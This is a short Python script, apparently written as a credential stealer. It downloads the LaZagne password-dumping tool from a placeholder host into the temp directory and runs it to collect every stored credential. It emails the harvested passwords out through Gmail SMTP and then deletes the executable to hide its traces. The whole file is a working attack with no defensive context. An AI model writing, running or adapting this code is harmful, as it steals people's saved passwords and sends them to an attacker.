#!/usr/bin/env python3

import requests
import subprocess
import smtplib
import os
import tempfile

def download(url):
    response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as output_file:
        output_file.write(response.content)


def send_email(email,password,message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download('https://example.com/LaZagne.exe')
result = subprocess.check_output("LaZagne.exe all", shell=True)
send_email('test@gmail.com', 'password123', result.decode('utf-8'))
os.remove('LaZagne.exe')